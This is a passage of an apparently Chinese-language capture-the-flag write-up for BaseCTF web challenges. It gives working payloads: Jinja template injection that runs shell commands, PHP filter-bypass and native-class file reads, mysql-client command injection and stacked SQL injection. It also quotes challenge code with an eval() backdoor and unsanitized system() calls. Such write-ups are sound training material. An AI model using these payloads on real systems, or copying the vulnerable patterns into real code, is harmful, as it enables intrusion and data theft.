</span></span><span class=line><span class=cl><span class=n>payload_json</span><span class=o>=</span><span class=n>json</span><span class=o>.</span><span class=n>dumps</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>payload_json</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>=</span><span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span><span class=n>data</span><span class=o>=</span><span class=n>payload_json</span><span class=p>,</span><span class=n>headers</span><span class=o>=</span><span class=n>headers</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>污染成功，去打<code>SSTI</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>http://challenge.basectf.fun:47522/index
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>flag={{url_for.__globals__.__builtins__[&#39;__import__&#39;](&#39;os&#39;).popen(&#39;tac /f*&#39;).read()}}
</span></span></code></pre></td></tr></table></div></div><h2 id=fin-just-readme-前置>[Fin] Just Readme (前置)</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>]);</span>
</span></span></code></pre></td></tr></table></div></div><p>CVE-2024-2961,由pwn的溢出打出RCE</p><h2 id=heading><strong>[Fin] Back to the future</strong></h2><p>恢复一下<code>git</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>githacker --url http://challenge.basectf.fun:44543/.git/ --output-folder &#39;./test&#39;
</span></span></code></pre></td></tr></table></div></div><p>很明显没有恢复完</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>git log --reflog
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>git reset --hard e2bc04bc70f7b7476ae7ad0e943ef62aa2b5556e
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>git reset --hard 9d85f10e0192ef630e10d7f876a117db41c30417
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>git reset --hard 8f7720b7891039b394e26e67ff10d6c6d2a144d5
</span></span></code></pre></td></tr></table></div></div><p>然后发现没有用，这里我们直接尝试去<code>show</code>一下历史文件</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=p>(</span><span class=n>kali</span><span class=err>㉿</span><span class=n>kali</span><span class=p>)</span><span class=o>-</span><span class=p>[</span><span class=o>~/</span><span class=err>桌面</span><span class=o>/</span><span class=n>tools</span><span class=o>/</span><span class=n>GitHack</span><span class=o>/</span><span class=n>test</span><span class=o>/</span><span class=mi>7342810</span><span class=n>b0f8b9cfe4b3e3b9fb211765f</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=err>└─</span><span class=o>$</span> <span class=n>git</span> <span class=nb>log</span> <span class=o>--</span><span class=n>oneline</span>                                                                                                                                      
</span></span><span class=line><span class=cl><span class=n>e2bc04b</span> <span class=p>(</span><span class=n>HEAD</span> <span class=o>-&gt;</span> <span class=n>master</span><span class=p>,</span> <span class=n>origin</span><span class=o>/</span><span class=n>master</span><span class=p>,</span> <span class=n>origin</span><span class=o>/</span><span class=n>HEAD</span><span class=p>)</span> <span class=n>Remove</span> <span class=n>Flag</span>
</span></span><span class=line><span class=cl><span class=mi>9</span><span class=n>d85f10</span> <span class=n>Add</span> <span class=n>What</span>
</span></span><span class=line><span class=cl><span class=mi>8</span><span class=n>f7720b</span> <span class=n>Initial</span> <span class=n>Commit</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>git show e2bc04b
</span></span></code></pre></td></tr></table></div></div><p>就拿到<code>flag</code>了，重新安装了一下这个工具来做这道题，发现还有更好用的命令</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>git reflog
</span></span><span class=line><span class=cl>git show 9d85f10:flag.txt
</span></span></code></pre></td></tr></table></div></div><p>并且安装工具的话也是直接pip就可以了，直接在我的Ubuntu20上面安装，用github上面的方法来安装有依赖冲突，没成功</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>pip3 install GitHacker
</span></span></code></pre></td></tr></table></div></div><h2 id=fin-1z_php>[Fin] 1z_php</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nx>highlight_file</span><span class=p>(</span><span class=s1>&#39;index.php&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=c1># 我记得她...好像叫flag.php吧？
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$emp</span><span class=o>=</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;e_m.p&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=nv>$try</span><span class=o>=</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;try&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nv>$emp</span><span class=o>!=</span><span class=s2>&#34;114514&#34;</span><span class=o>&amp;&amp;</span><span class=nx>intval</span><span class=p>(</span><span class=nv>$emp</span><span class=p>,</span><span class=mi>0</span><span class=p>)</span><span class=o>===</span><span class=mi>114514</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=nv>$i</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span><span class=nv>$i</span><span class=o>&lt;</span><span class=nx>strlen</span><span class=p>(</span><span class=nv>$emp</span><span class=p>);</span><span class=nv>$i</span><span class=o>++</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nx>ctype_alpha</span><span class=p>(</span><span class=nv>$emp</span><span class=p>[</span><span class=nv>$i</span><span class=p>])){</span>
</span></span><span class=line><span class=cl>            <span class=k>die</span><span class=p>(</span><span class=s2>&#34;你不是hacker？那请去外场等候！&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s2>&#34;只有真正的hacker才能拿到flag！&#34;</span><span class=o>.</span><span class=s2>&#34;&lt;br&gt;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/.+?HACKER/is&#39;</span><span class=p>,</span><span class=nv>$try</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>        <span class=k>die</span><span class=p>(</span><span class=s2>&#34;你是hacker还敢自报家门呢？&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>stripos</span><span class=p>(</span><span class=nv>$try</span><span class=p>,</span><span class=s1>&#39;HACKER&#39;</span><span class=p>)</span> <span class=o>===</span> <span class=k>TRUE</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=k>die</span><span class=p>(</span><span class=s2>&#34;你连自己是hacker都不承认，还想要flag呢？&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nv>$a</span><span class=o>=</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;a&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=nv>$b</span><span class=o>=</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;b&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=nv>$c</span><span class=o>=</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;c&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nx>stripos</span><span class=p>(</span><span class=nv>$b</span><span class=p>,</span><span class=s1>&#39;php&#39;</span><span class=p>)</span><span class=o>!==</span><span class=mi>0</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=k>die</span><span class=p>(</span><span class=s2>&#34;收手吧hacker，你得不到flag的！&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=p>(</span><span class=k>new</span> <span class=nv>$a</span><span class=p>(</span><span class=nv>$b</span><span class=p>))</span><span class=o>-&gt;</span><span class=nv>$c</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>else</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>die</span><span class=p>(</span><span class=s2>&#34;114514到底是啥意思嘞？。？&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=c1># 觉得困难的话就直接把shell拿去用吧，不用谢~
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$shell</span><span class=o>=</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;shell&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=k>eval</span><span class=p>(</span><span class=nv>$shell</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>绕第一层的时候Demo的参数写错了 ，浪费了一些时间</p><p>第一层用8进制绕过，第二层的话，用溢出绕过，第三层的话利用原生类进行读取</p><p>但是溢出这里得注意，hackbar发包不好用，所以使用Python脚本但是太多的话，又会直接给关了，不让连接</p><p>第三层这个原生类的利用在官方文档中仅仅只是一笔带过了所以测试一下就好了，又是一个新姿势</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=p>(</span><span class=k>new</span> <span class=nx>SplFileObject</span><span class=p>(</span><span class=s2>&#34;php://filter/convert.base64-encode/resource=./2.php&#34;</span><span class=p>))</span><span class=o>-&gt;</span><span class=na>__toString</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=o>/*</span><span class=nx>成功读取到了</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>url</span><span class=o>=</span><span class=s2>&#34;http://challenge.basectf.fun:45966/&#34;</span>
</span></span><span class=line><span class=cl><span class=n>params</span><span class=o>=</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;e[m.p&#39;</span><span class=p>:</span><span class=s1>&#39;0337522&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;a&#39;</span><span class=p>:</span><span class=s1>&#39;SplFileObject&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;b&#39;</span><span class=p>:</span><span class=s1>&#39;php://filter/convert.base64-encode/resource=flag.php&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;c&#39;</span><span class=p>:</span><span class=s1>&#39;__toString&#39;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>data</span><span class=o>=</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;try&#39;</span><span class=p>:</span><span class=s1>&#39;1&#39;</span><span class=o>*</span><span class=mi>1000002</span><span class=o>+</span><span class=s1>&#39;HACKER&#39;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>=</span><span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=o>=</span><span class=n>url</span><span class=p>,</span><span class=n>params</span><span class=o>=</span><span class=n>params</span><span class=p>,</span><span class=n>data</span><span class=o>=</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>还有一个<code>shell</code>但是用不上，找不到<code>flag</code></p><h2 id=fin-rce-or-sql-inject>[Fin] RCE or Sql Inject</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$sql</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;sql&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/se|ec|;|@|del|into|outfile/i&#39;</span><span class=p>,</span> <span class=nv>$sql</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>die</span><span class=p>(</span><span class=s2>&#34;你知道的，不可能有sql注入&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/&#34;|\$|`|\\\\/i&#39;</span><span class=p>,</span> <span class=nv>$sql</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>die</span><span class=p>(</span><span class=s2>&#34;你知道的，不可能有RCE&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nv>$query</span> <span class=o>=</span> <span class=s2>&#34;mysql -u root -p123456 -e </span><span class=se>\&#34;</span><span class=s2>use ctf;select &#39;ctfer! You can</span><span class=se>\\</span><span class=s2>&#39;t succeed this time! hahaha&#39;; -- &#34;</span> <span class=o>.</span> <span class=nv>$sql</span> <span class=o>.</span> <span class=s2>&#34;</span><span class=se>\&#34;</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nx>system</span><span class=p>(</span><span class=nv>$query</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p><code>mysql</code>远程连接中可以执行命令?!,泰裤辣</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>system    (\!) Execute a system shell command.
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>http://challenge.basectf.fun:33244/?sql=%0asystem env
</span></span></code></pre></td></tr></table></div></div><h2 id=fin-sql-inject-or-rce>[Fin] Sql Inject or RCE</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$sql</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;sql&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/se|ec|st|;|@|delete|into|outfile/i&#39;</span><span class=p>,</span> <span class=nv>$sql</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>die</span><span class=p>(</span><span class=s2>&#34;你知道的，不可能有sql注入&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/&#34;|\$|`|\\\\/i&#39;</span><span class=p>,</span> <span class=nv>$sql</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>die</span><span class=p>(</span><span class=s2>&#34;你知道的，不可能有RCE&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nv>$query</span> <span class=o>=</span> <span class=s2>&#34;mysql -u root -p123456 -e </span><span class=se>\&#34;</span><span class=s2>use ctf;select &#39;ctfer! You can</span><span class=se>\\</span><span class=s2>&#39;t succeed this time! hahaha&#39;; -- &#34;</span> <span class=o>.</span> <span class=nv>$sql</span> <span class=o>.</span> <span class=s2>&#34;</span><span class=se>\&#34;</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nx>system</span><span class=p>(</span><span class=nv>$query</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>使用<code>delimiter</code>和<code>handler</code>打一个堆叠注入</p><p>第一个关键词测试一下就知道怎么用了</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=n>mysql</span><span class=o>&gt;</span><span class=w> </span><span class=k>delimiter</span><span class=w> </span><span class=o>?</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mysql</span><span class=o>&gt;</span><span class=w> </span><span class=k>show</span><span class=w> </span><span class=n>tables</span><span class=o>?</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>-----------------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>|</span><span class=w> </span><span class=n>Tables_in_newdb</span><span class=w> </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>-----------------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>|</span><span class=w> </span><span class=n>flag</span><span class=w>            </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=n>sds_user</span><span class=w>        </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=n>users</span><span class=w>           </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>-----------------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=mi>3</span><span class=w> </span><span class=k>rows</span><span class=w> </span><span class=k>in</span><span class=w> </span><span class=k>set</span><span class=w> </span><span class=p>(</span><span class=mi>0</span><span class=p>.</span><span class=mi>02</span><span class=w> </span><span class=n>sec</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mysql</span><span class=o>&gt;</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>flag</span><span class=o>?</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>----+------------+-------------------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>|</span><span class=w> </span><span class=n>id</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>name</span><span class=w>       </span><span class=o>|</span><span class=w> </span><span class=n>description</span><span class=w>       </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>----+------------+-------------------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>|</span><span class=w>  </span><span class=mi>1</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>alpha</span><span class=w>      </span><span class=o>|</span><span class=w> </span><span class=k>first</span><span class=w>             </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>  </span><span class=mi>2</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>beta</span><span class=w>       </span><span class=o>|</span><span class=w> </span><span class=k>second</span><span class=w>            </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>  </span><span class=mi>3</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>gamma</span><span class=w>      </span><span class=o>|</span><span class=w> </span><span class=n>third</span><span class=w>             </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>  </span><span class=mi>4</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>alphabet</span><span class=w>   </span><span class=o>|</span><span class=w> </span><span class=k>first</span><span class=o>-</span><span class=n>alphabet</span><span class=w>    </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>  </span><span class=mi>5</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>beta</span><span class=o>-</span><span class=n>gamma</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=k>second</span><span class=o>-</span><span class=n>beta</span><span class=o>-</span><span class=n>gamma</span><span class=w> </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>----+------------+-------------------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=mi>5</span><span class=w> </span><span class=k>rows</span><span class=w> </span><span class=k>in</span><span class=w> </span><span class=k>set</span><span class=w> </span><span class=p>(</span><span class=mi>0</span><span class=p>.</span><span class=mi>02</span><span class=w> </span><span class=n>sec</span><span class=p>)</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>所以我们重新设置之后就可以打堆叠，也就是第四周想进行的操作</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=n>mysql</span><span class=o>&gt;</span><span class=w> </span><span class=k>handler</span><span class=w> </span><span class=n>flag</span><span class=w> </span><span class=k>open</span><span class=o>?</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>Query</span><span class=w> </span><span class=n>OK</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=w> </span><span class=k>rows</span><span class=w> </span><span class=n>affected</span><span class=w> </span><span class=p>(</span><span class=mi>0</span><span class=p>.</span><span class=mi>01</span><span class=w> </span><span class=n>sec</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mysql</span><span class=o>&gt;</span><span class=w> </span><span class=k>handler</span><span class=w> </span><span class=n>flag</span><span class=w> </span><span class=k>read</span><span class=w> </span><span class=k>next</span><span class=o>?</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>----+-------+-------------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>|</span><span class=w> </span><span class=n>id</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>name</span><span class=w>  </span><span class=o>|</span><span class=w> </span><span class=n>description</span><span class=w> </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>----+-------+-------------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>|</span><span class=w>  </span><span class=mi>1</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>alpha</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=k>first</span><span class=w>       </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>----+-------+-------------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=mi>1</span><span class=w> </span><span class=k>row</span><span class=w> </span><span class=k>in</span><span class=w> </span><span class=k>set</span><span class=w> </span><span class=p>(</span><span class=mi>0</span><span class=p>.</span><span class=mi>02</span><span class=w> </span><span class=n>sec</span><span class=p>)</span><span class=w>
